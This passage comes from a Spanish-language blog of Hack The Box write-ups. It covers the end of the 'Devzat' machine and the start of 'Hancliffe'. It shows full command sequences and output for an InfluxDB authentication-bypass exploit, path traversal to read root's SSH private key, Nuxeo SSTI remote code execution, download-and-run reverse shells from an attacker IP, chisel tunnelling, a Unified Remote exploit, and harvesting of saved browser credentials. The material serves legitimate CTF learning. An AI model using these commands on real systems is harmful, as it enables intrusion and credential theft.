config. patrick@devzat:~$ curl -XPOST http://172.17.0.2:8086/api/v2/write 404 page not found  Después de investigar sobre las vulnerabilidades de InfluxDB, encontramos un exploit para el CVE-2019-20933. Se trata de un script en Python que realiza un ataque de fuerza bruta sobre el nombre de usuario y después proporciona una conexión a la base de datos de InfluxDB.\nDespués de transferirlo a la máquina (y quitarle algunas dependencias que no eran necesarias), podemos ver el contenido de la base de datos. Para ello, se ha utilizado una chuleta de comandos de InfluxDB.\npatrick@devzat:/tmp$ curl 10.10.17.44/__main__.py -so x.py patrick@devzat:/tmp$ cat \u0026gt; wordlist patrick admin catherine devzat ^C patrick@devzat:/tmp$ python3 x.py Insert ip host (default localhost): Insert port (default 8086): Insert influxdb user (wordlist path to bruteforce username): ./wordlist Start username bruteforce [x] patrick [v] admin Host vulnerable !!! Databases list: 1) devzat 2) _internal Insert database name (exit to close): devzat [devzat] Insert query (exit to change db): SHOW MEASUREMENTS { \"results\": [ { \"series\": [ { \"columns\": [ \"name\" ], \"name\": \"measurements\", \"values\": [ [ \"user\" ] ] } ], \"statement_id\": 0 } ] } [devzat] Insert query (exit to change db): SHOW FIELD KEYS FROM \"user\" { \"results\": [ { \"series\": [ { \"columns\": [ \"fieldKey\", \"fieldType\" ], \"name\": \"user\", \"values\": [ [ \"enabled\", \"boolean\" ], [ \"password\", \"string\" ], [ \"username\", \"string\" ] ] } ], \"statement_id\": 0 } ] } [devzat] Insert query (exit to change db): SELECT * FROM \"user\" { \"results\": [ { \"series\": [ { \"columns\": [ \"time\", \"enabled\", \"password\", \"username\" ], \"name\": \"user\", \"values\": [ [ \"2021-06-22T20:04:16.313965493Z\", false, \"WillyWonka2021\", \"wilhelm\" ], [ \"2021-06-22T20:04:16.320782034Z\", true, \"woBeeYareedahc7Oogeephies7Aiseci\", \"catherine\" ], [ \"2021-06-22T20:04:16.996682002Z\", true, \"RoyalQueenBee$\", \"charles\" ] ] } ], \"statement_id\": 0 } ] }  Y obtenemos algunas contraseñas. Ahora podemos tratar de acceder con credenciales catherine:woBeeYareedahc7Oogeephies7Aiseci.\nDespués de escribir la contraseña, podemos leer la flag user.txt:\npatrick@devzat:/tmp$ su catherine Password: catherine@devzat:/tmp$ cd catherine@devzat:~$ cat user.txt 67a4643d026d2adced0fd951ea2eb5a9  Ahora que estamos como catherine, podemos ver si tenemos permisos de sudo:\ncatherine@devzat:~$ sudo -l [sudo] password for catherine: Sorry, user catherine may not run sudo on devzat.  Escalada de privilegios Podemos recordar que existían dos archivos ZIP de catherine con dos versiones del chat sobre SSH:\ncatherine@devzat:~$ cd /var/backups/ catherine@devzat:/var/backups$ ll total 1128 drwxr-xr-x 2 root root 4096 Mar 9 06:25 ./ drwxr-xr-x 14 root root 4096 Jun 22 2021 ../ -rw-r--r-- 1 root root 51200 Mar 9 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 59142 Sep 28 18:45 apt.extended_states.0 -rw-r--r-- 1 root root 6588 Sep 21 20:17 apt.extended_states.1.gz -rw-r--r-- 1 root root 6602 Jul 16 2021 apt.extended_states.2.gz -rw------- 1 catherine catherine 28297 Jul 16 2021 devzat-dev.zip -rw------- 1 catherine catherine 27567 Jul 16 2021 devzat-main.zip -rw-r--r-- 1 root root 268 Sep 29 11:46 dpkg.diversions.0 -rw-r--r-- 1 root root 170 Jul 16 2021 dpkg.statoverride.0 -rw-r--r-- 1 root root 949034 Jan 26 14:52 dpkg.status.0 catherine@devzat:/var/backups$ python3 -m http.server 7000 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...  Podemos transferir los archivos a nuestra máquina abriendo un servidor web con Python en el puerto 7000:\n$ wget -q devzat.htb:7000/devzat-{main,dev}.zip  catherine@devzat:/var/backups$ python3 -m http.server 7000 Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ... 10.10.17.44 - - [] \"GET /devzat-main.zip HTTP/1.1\" 200 - 10.10.17.44 - - [] \"GET /devzat-dev.zip HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  Y después descomprimirlos:\n$ unzip devzat-dev.zip Archive: devzat-dev.zip creating: dev/ inflating: dev/go.mod extracting: dev/.gitignore inflating: dev/util.go inflating: dev/testfile.txt inflating: dev/eastereggs.go inflating: dev/README.md inflating: dev/games.go inflating: dev/colors.go extracting: dev/log.txt inflating: dev/commands.go inflating: dev/start.sh inflating: dev/devchat.go inflating: dev/LICENSE inflating: dev/commandhandler.go inflating: dev/art.txt inflating: dev/go.sum extracting: dev/allusers.json $ unzip devzat-main.zip Archive: devzat-main.zip creating: main/ inflating: main/go.mod extracting: main/.gitignore inflating: main/util.go inflating: main/eastereggs.go inflating: main/README.md inflating: main/games.go inflating: main/colors.go extracting: main/log.txt inflating: main/commands.go inflating: main/start.sh inflating: main/devchat.go inflating: main/LICENSE inflating: main/commandhandler.go inflating: main/art.txt inflating: main/go.sum inflating: main/allusers.json  Analizando las nuevas funcionalidades del chat Ahora que tenemos las dos carpetas, podemos utilizar diff para ver las diferencias entre los proyectos:\n$ diff main dev  diff main/allusers.json dev/allusers.json 1,3c1 \u0026lt; { \u0026lt; \"eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3\": \"\\u001b[38;5;214mtest\\u001b[39m\" \u0026lt; } --- \u0026gt; {} diff main/commands.go dev/commands.go 3a4 \u0026gt; \"bufio\" 4a6,7 \u0026gt; \"os\" \u0026gt; \"path/filepath\" 36a40 \u0026gt; file = commandInfo{\"file\", \"Paste a files content directly to chat [alpha]\", fileCommand, 1, false, nil} 38c42,101 \u0026lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} --- \u0026gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} \u0026gt; } \u0026gt; \u0026gt; func fileCommand(u *user, args []string) { \u0026gt; if len(args) \u0026lt; 1 { \u0026gt; u.system(\"Please provide file to print and the password\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; if len(args) \u0026lt; 2 { \u0026gt; u.system(\"You need to provide the correct password to use this function\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; path := args[0] \u0026gt; pass := args[1] \u0026gt; \u0026gt; // Check my secure password \u0026gt; if pass != \"CeilingCatStillAThingIn2021?\" { \u0026gt; u.system(\"You did provide the wrong password\") \u0026gt; return \u0026gt; } \u0026gt; \u0026gt; // Get CWD \u0026gt; cwd, err := os.Getwd() \u0026gt; if err != nil { \u0026gt; u.system(err.Error()) \u0026gt; } \u0026gt; \u0026gt; // Construct path to print \u0026gt; printPath := filepath.Join(cwd, path) \u0026gt; \u0026gt; // Check if file exists \u0026gt; if _, err := os.Stat(printPath); err == nil { \u0026gt; // exists, print \u0026gt; file, err := os.Open(printPath) \u0026gt; if err != nil { \u0026gt; u.system(fmt.Sprintf(\"Something went wrong opening the file: %+v\", err.Error())) \u0026gt; return \u0026gt; } \u0026gt; defer file.Close() \u0026gt; \u0026gt; scanner := bufio.NewScanner(file) \u0026gt; for scanner.Scan() { \u0026gt; u.system(scanner.Text()) \u0026gt; } \u0026gt; \u0026gt; if err := scanner.Err(); err != nil { \u0026gt; u.system(fmt.Sprintf(\"Something went wrong printing the file: %+v\", err.Error())) \u0026gt; } \u0026gt; \u0026gt; return \u0026gt; \u0026gt; } else if os.IsNotExist(err) { \u0026gt; // does not exist, print error \u0026gt; u.system(fmt.Sprintf(\"The requested file @ %+v does not exist!\", printPath)) \u0026gt; return \u0026gt; } \u0026gt; // bokred? \u0026gt; u.system(\"Something went badly wrong.\") diff main/devchat.go dev/devchat.go 27c27 \u0026lt; port = 8000 --- \u0026gt; port = 8443 114c114 \u0026lt; fmt.Sprintf(\":%d\", port), --- \u0026gt; fmt.Sprintf(\"127.0.0.1:%d\", port), Only in dev: testfile.txt  Parece que la nueva funcionalidad del chat permite mostrar el contenido de un archivo dado desde el directorio de trabajo actual. Para ejecutar el comando, hay que usar la contraseña CeilingCatStillAThingIn2021?.\nOtra diferencia es que el chat de desarrollo está en el puerto 8443, de manera interna.\nObteniendo la clave privada SSH de root Primero, podemos tratar de cargar el archivo /tmp/wordlist, creado anteriormente:\ncatherine@devzat:/var/backups$ ssh -l asdf 127.0.0.1 -p 8443 Welcome to the chat. There are no more users devbot: asdf has joined the chat asdf: /file [SYSTEM] Please provide file to print and the password asdf: /file /tmp/wordlist CeilingCatStillAThingIn2021? [SYSTEM] The requested file @ /root/devzat/tmp/wordlist does not exist!  Podemos ver que /tmp/wordlist se concatena con /root/devzat. Esto nos indica que el chat lo está ejecutando root, y que por tanto tenemos permisos de lectura.\nPara ganar acceso como root, podemos leer la clave privada de SSH utilizando una navegación de directorios (es decir, poner ../.ssh/id_rsa como archivo, de manera que el archivo solicitado es /root/devzat/../.ssh/id_rsa, que es equivalente a /root/.ssh/id_rsa):\nasdf: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021? [SYSTEM] -----BEGIN OPENSSH PRIVATE KEY----- [SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW [SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1 [SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA [SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s [SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg== [SYSTEM] -----END OPENSSH PRIVATE KEY-----  Finalmente, guardamos la clave y nos conectamos como root por SSH (sin necesidad de utilizar contraseña). Con esto, ya podemos obtener la flag root.txt:\n$ chmod 600 id_rsa $ ssh -i id_rsa root@devzat.htb root@devzat:~# cat root.txt e165e399c6a2c920a406997193f68a43  ","image":"/images/HTB/Devzat/Devzat.png","permalink":"https://7rocky.github.io/htb/devzat/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina contiene un servicio de chat sobre SSH y un subdominio web oculto vulnerable a inyección de comandos. Luego, podemos acceder a la máquina y explotar una versión vulnerable de InfluxDB para extraer la contraseña de otro usuario. Este usuario tiene permisos para ver un proyecto en desarrollo del chat de SSH que permite leer archivos arbitrarios del servidor. Para comprometer esta máquina se necesitan conocimientos básicos de explotación web y enumeración en Linux","time":13,"title":"Devzat"},{"contents":"  SO: Windows   Dificultad: Difícil   Dirección IP: 10.10.11.115   Fecha: 09 / 10 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.115 -p 80,8000,9999 Nmap scan report for 10.10.11.115 Host is up (0.14s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.21.0 |_http-title: Welcome to nginx! |_http-server-header: nginx/1.21.0 8000/tcp open http nginx 1.21.0 |_http-title: HashPass | Open Source Stateless Password Manager |_http-server-header: nginx/1.21.0 9999/tcp open abyss? | fingerprint-strings: | FourOhFourRequest, GetRequest, HTTPOptions: | Welcome Brankas Application. | Username: Password: | NULL: | Welcome Brankas Application. |_ Username: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 35.05 seconds  La máquina tiene abiertos los puertos 80 (HTTP), 8000 (HTTP) y 9999.\nEnumeración web Si vamos a http://10.10.11.115:8000, vemos una página con una aplicación de generación de contraseñas:\nPero no hay nada interesante de momento. Si vamos a http://10.10.11.115 veremos una página por defecto de nginx:\nPodemos tratar de aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.115/FUZZ %20 [Status: 200, Size: 612, Words: 79, Lines: 26] maintenance [Status: 302, Size: 0, Words: 1, Lines: 1]  Y vemos que hay una ruta /maintenance, que redirige a /nuxeo/Maintenance/:\n$ curl 10.10.11.115/maintenance -I HTTP/1.1 302 Server: nginx/1.21.0 Date: Content-Length: 0 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Location: /nuxeo/Maintenance/  Si ponemos una barra al final, veremos algo de información:\nY también nos pone una cookie JSESSIONID para /nuxeo:\n$ curl 10.10.11.115/maintenance/ -I HTTP/1.1 200 Server: nginx/1.21.0 Date: Content-Type: text/html;charset=ISO-8859-1 Content-Length: 714 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Set-Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo; Path=/nuxeo; HttpOnly Vary: Accept-Encoding  La página web está desarrollada en Java (debido a la cookie JSESSIONID). Como hay un nginx, es posible que exista alguna vulnerabilidad de navegación de directorios (rompiendo la lógica del parser, más información aquí). Vamos a probar:\n$ curl '10.10.11.115/maintenance/..;/' -iH 'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo' HTTP/1.1 302 Server: nginx/1.21.0 Date: Sun, 06 Mar 2022 21:54:29 GMT Content-Type: text/html;charset=ISO-8859-1 Content-Length: 0 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block Location: http://10.10.11.115/nuxeo/nxstartup.faces  Está redirigiendo a /nuxeo/nxstartup.faces. Vamos a ver qué hy en esta ruta:\n$ curl '10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces' -iH 'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo' HTTP/1.1 401 Server: nginx/1.21.0 Date: Sun, 06 Mar 2022 21:54:43 GMT Content-Type: text/html;charset=UTF-8 Content-Length: 220 Connection: keep-alive X-Frame-Options: SAMEORIGIN X-UA-Compatible: IE=10; IE=11 Cache-Control: no-cache, no-store, must-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: * X-XSS-Protection: 1; mode=block \u0026lt;script type=\"text/javascript\"\u0026gt; document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/'; window.location = 'http://10.10.11.115/nuxeo/login.jsp'; \u0026lt;/script\u0026gt;  De nuevo, nos redirige. Y aquí tenemos un formulario de inicio de sesión:\nAquí podemos ver la versión, que es Nuxeo FT 10.2. Existe una vulnerabilidad que consigue ejecución remota de comandos (RCE) por medio de Server-Side Template Injection (SSTI) en Java (CVE-2018-16341). Podemos leer cómo funciona el exploit y probar si es vulnerable:\n$ curl $(echo 'http://10.10.11.115/maintenance/..;/login.jsp/pwn${7*7}.xhtml' | sed 's/{/%7b/g' | sed 's/}/%7d/g') \u0026lt;span\u0026gt;\u0026lt;span style=\"color:red;font-weight:bold;\"\u0026gt;ERROR: facelet not found at '/login.jsp/pwn49.xhtml'\u0026lt;/span\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;  Nótese que hemos codificado los caracteres { and } en codificación URL (%7b and %7d). Como aparece pwn49.xhtml en la respuesta, sabemos que es vulnerable.\nAcceso a la máquina Ahora podemos utilizar el exploit de Python para ejecutar comandos en el servidor. Tenemos que modificar la URL y la arquitectura para hacer que funcione:\n$ python3 CVE-2018-16341.py Nuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341 [+] Checking template injection vulnerability = OK command (WIN)\u0026gt; whoami [+] Executing command =\u0026gt; hancliffe\\svc_account  Ahora podemos intentar utilizar una reverse shell. Para ello, primero tenemos que verificar que el servidor tiene traza con la máquina de atacante:\ncommand (WIN)\u0026gt; curl 10.10.17.44 [+] Executing command =\u0026gt; \u0026amp;lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"\u0026amp;gt;  Y sí la tiene:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.115 - - [] \"GET / HTTP/1.1\" 200 -  Para establecer la conexión de reverse shell utilizaré ConPtyShell. Tenemos que descargarlo y después ejecutarlo desde la máquina mientras escuchamos con nc:\ncommand (WIN)\u0026gt; curl 10.10.17.44/ConPtyShell.exe -o /windows/temp/r.exe [+] Executing command =\u0026gt; command (WIN)\u0026gt; /windows/temp/r.exe 10.10.17.44 4444 50 158 [+] Executing command =\u0026gt;  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:51152. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Nuxeo\u0026gt;  Enumeración del sistema Existen algunos usuarios(clara, development y Administrator):\nPS C:\\Nuxeo\u0026gt; dir C:\\Users Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/30/2021 9:54 AM Administrator d----- 11/30/2021 9:54 AM clara d----- 6/26/2021 10:35 PM development d-r--- 6/3/2021 7:00 AM Public d----- 11/30/2021 9:54 AM svc_account PS C:\\Nuxeo\u0026gt; tree C:\\Users Folder PATH listing Volume serial number is 00000077 B0F6:2F1B C:\\USERS ├───Administrator ├───clara ├───development ├───Public │ ├───Documents │ ├───Downloads │ ├───Music │ ├───Pictures │ └───Videos └───svc_account ├───.nxshell ├───3D Objects ├───Contacts ├───Desktop ├───Documents │ └───WindowsPowerShell ├───Downloads ├───Favorites │ └───Links ├───Links ├───Music ├───OneDrive ├───Pictures │ ├───Camera Roll │ └───Saved Pictures ├───Saved Games ├───Searches └───Videos  Podemos mostrar algunas configuraciones de red:\nPS C:\\Nuxeo\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : htb IPv6 Address. . . . . . . . . . . : dead:beef::111 IPv6 Address. . . . . . . . . . . : dead:beef::f0d6:7043:d0e5:2d98 Temporary IPv6 Address. . . . . . : dead:beef::ac37:ca27:2783:1789 Link-local IPv6 Address . . . . . : fe80::f0d6:7043:d0e5:2d98%7 IPv4 Address. . . . . . . . . . . : 10.10.11.115 Subnet Mask . . . . . . . . . . . : 255.255.254.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:324%7 10.10.10.2 PS C:\\Nuxeo\u0026gt; netstat -nat | Select-String LISTEN TCP 0.0.0.0:80 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:135 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:445 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5432 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9321 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9510 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9512 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9512 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:9999 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING InHost TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING InHost TCP 10.10.11.115:139 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:1080 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8005 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8009 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8080 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:9200 0.0.0.0:0 LISTENING InHost TCP 127.0.0.1:9300 0.0.0.0:0 LISTENING InHost TCP [::]:135 [::]:0 LISTENING InHost TCP [::]:445 [::]:0 LISTENING InHost TCP [::]:5432 [::]:0 LISTENING InHost TCP [::]:5985 [::]:0 LISTENING InHost TCP [::]:9512 [::]:0 LISTENING InHost TCP [::]:47001 [::]:0 LISTENING InHost TCP [::]:49664 [::]:0 LISTENING InHost TCP [::]:49665 [::]:0 LISTENING InHost TCP [::]:49666 [::]:0 LISTENING InHost TCP [::]:49667 [::]:0 LISTENING InHost TCP [::]:49668 [::]:0 LISTENING InHost  También podemos ver si hay alguna ruta excluida por Windows Defender:\nPS C:\\Nuxeo\u0026gt; reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths' HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths C:\\DevApp\\MyFirstApp.exe REG_DWORD 0x0  Y nos muestra un binario, pero no podemos leerlo aún.\nEn C:\\Program Files (x86) hay una carpeta Unified Remote 3:\nPS C:\\Nuxeo\u0026gt; dir 'C:\\Program Files (x86)' Directory: C:\\Program Files (x86) Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 6/3/2021 7:11 AM Common Files d----- 10/3/2021 11:08 PM Internet Explorer d----- 6/3/2021 8:09 PM Microsoft d----- 12/7/2019 6:48 AM Microsoft.NET d----- 6/26/2021 10:15 PM Mozilla Maintenance Service d----- 6/12/2021 2:51 AM MSBuild d----- 6/12/2021 2:51 AM Reference Assemblies d----- 6/12/2021 12:21 AM Unified Remote 3 d----- 4/9/2021 6:48 AM Windows Defender d----- 7/18/2021 12:20 AM Windows Mail d----- 12/7/2019 6:44 AM Windows NT d----- 4/9/2021 6:48 AM Windows Photo Viewer d----- 12/7/2019 1:25 AM WindowsPowerShell  El servicio utiliza el puerto 9512, que está en escucha como se mostró anteriormente en la enumeración de red.\nMovimiento lateral al usuario clara Existe un exploit público de Unified Remote 3 en ExploitDB. Para utilizarlo, debemos exponer el puerto afuera mediante chisel:\n$ ./chisel server --reverse -p 1234 server: Reverse tunnelling enabled server: Fingerprint L32jA7y7l060Ux4y/lkeGtEmYY/JuhFiN+7tqA3v0TU= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:9512=9512: Listening  PS C:\\Nuxeo\u0026gt; curl 10.10.17.44/chisel.exe -o C:\\Windows\\Temp\\c.exe PS C:\\Nuxeo\u0026gt; C:\\Windows\\Temp\\c.exe client 10.10.17.44:1234 R:9512:127.0.0.1:9512 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 77.0068ms)  El exploit básicamente se descarga un binario desde la máquina de atacante en C:\\Windows\\Temp y luego lo ejecuta. Decidí modificar el exploit para utilizar ConPtyShell.\n$ python2 49587.py 127.0.0.1 10.10.17.44 ConPtyShell.exe [+] Connecting to target... [+] Popping Start Menu [+] Opening CMD [+] *Super Fast Hacker Typing* [+] Downloading Payload [+] Done! Check listener?  Y conseguimos acceso como clara:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:58167. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\clara\u0026gt;  Aquí ya podemos leer la flag user.txt:\nPS C:\\Users\\clara\u0026gt; type Desktop\\user.txt 3aa9dcfca7cac59c24ed2f14a0952ee7  Pero seguimos sin poder leer el binario en C:\\DevApp:\nPS C:\\Users\\clara\u0026gt; dir C:\\DevApp dir : Access to the path 'C:\\DevApp' is denied. At line:1 char:1 + dir C:\\DevApp + ~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\DevApp:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand  Si ejecutamos winPEAS para enumerar más, obtenemos unas credenciales guardadas en Firefox:\n════════════════════════════════════╣ Browsers Information ╠════════════════════════════════════ ╔══════════╣ Showing saved credentials for Firefox Url: http://localhost:8000 Username: hancliffe.htb Password: #@H@ncLiff3D3velopm3ntM@st3rK3y*! ================================================================================================= ╔══════════╣ Looking for Firefox DBs ╚ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history Firefox credentials file exists at C:\\Users\\clara\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljftf853.default-release\\key4.db ╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)  winPEAS ya nos extrae las contraseñas de la base de datos de Firefox, aunque podríamos haber usado FirePwd.\nMovimimento lateral al usuario development Había otro usuario llamado development. Podemos tratar de conectarnos al servidor utilizando evil-winrm (configurando chisel para exponer el puerto 5985):\nPS C:\\Nuxeo\u0026gt; C:\\Windows\\Temp\\c.exe client 10.10.17.44:1234 R:5985:127.0.0.1:5985 2022/03/06 17:14:36 client: Connecting to ws://10.10.17.44:1234 2022/03/06 17:14:37 client: Connected (Latency 105.431ms)  Podemos probar la contraseña para development pero no funciona:\n$ evil-winrm -i 127.0.0.1 -u development -p '#@H@ncLiff3D3velopm3ntM@st3rK3y*!' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1  Aquí tenemos que recordar que había un servicio web que generaba contraseñas a partir de otros campos y una contraseña maestra (el usuario ha debido almacenar los campos del formulario en la base de datos de Firefox por usabilidad).\nSi utilizamos development, hancliffe.htb y #@H@ncLiff3D3velopm3ntM@st3rK3y*! obtenemos AMl.q2DHp?2.C/V0kNFU como contraseña:\nVamos a probar ahora:\n$ evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt;  Funciona. Y ahora sí podemos acceder a C:\\DevApp:\n$ evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt; dir C:\\DevApp Directory: C:\\DevApp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/14/2021 5:02 AM 60026 MyFirstApp.exe -a---- 9/14/2021 10:57 AM 636 restart.ps1  Podemos descargar el binario a la máquina de atacante utilizando las funciones de evil-winrm:\n*Evil-WinRM* PS C:\\Users\\development\\Documents\u0026gt; download C:\\DevApp\\MyFirstApp.exe ./MyFirstApp.exe Info: Downloading C:\\DevApp\\MyFirstApp.exe to ./MyFirstApp.exe Info: Download successful!  Ingeniería inversa sobre el binario Tenemos un binario ejecutable de Windows de 32 bits:\n$ file MyFirstApp.exe MyFirstApp.exe: PE32 executable (console) Intel 80386, for MS Windows  Podemos utilizar strings para ver cosas interesantes. Por ejemplo, podemos ver el comando con el que fue compilado el binario:\n$ strings MyFirstApp.exe | grep protector GNU C17 8.1.0 -mtune=generic -march=i686 -g -g -g -O2 -O2 -O2 -fno-ident -fbuilding-libgcc -fno-stack-protector  Y también podemos encontrar usuarios, códigos y contraseñas cifradas:\n$ strings MyFirstApp.exe | grep -C 10 Password setsockopt failed with error: %d bind failed with error: %d Waiting Connection listen failed with error: %d Accept failed with error: %d Connection Received thread cretead Welcome Brankas Application. Send failed with error: %d Username: Password: Login Successfully! FullName: Input Your Code: T3D83CbJkl1299 Vickry Alfiansyah Unlocked Wrong Code Recv failed with error: %d Username or Password incorrect alfiansyah YXlYeDtsbD98eDtsWms5SyU= Unknown error _matherr(): %s in %s(%g, %g) (retval=%g) Argument domain error (DOMAIN) Argument singularity (SIGN) Overflow range error (OVERFLOW) The result is too small to be represented (UNDERFLOW) Total loss of significance (TLOSS) Partial loss of significance (PLOSS)  Vemos también un mensaje \u0026ldquo;Welcome to Brankas Application\u0026rdquo;. Este es el mensaje mostrado por el servicio expuesto en el puerto 9999 (reportado por nmap al comienzo). Por tanto, tenemos el binario que produce dicho servicio.\nExiste un texto que parece una contraseña codificada en Base64, vamos a decodificarla:\n$ echo YXlYeDtsbD98eDtsWms5SyU= | base64 -d ayXx;ll?|x;lZk9K%  Podría ser la contraseña en texto claro, podemos tratar de usarla en remoto con el usuario 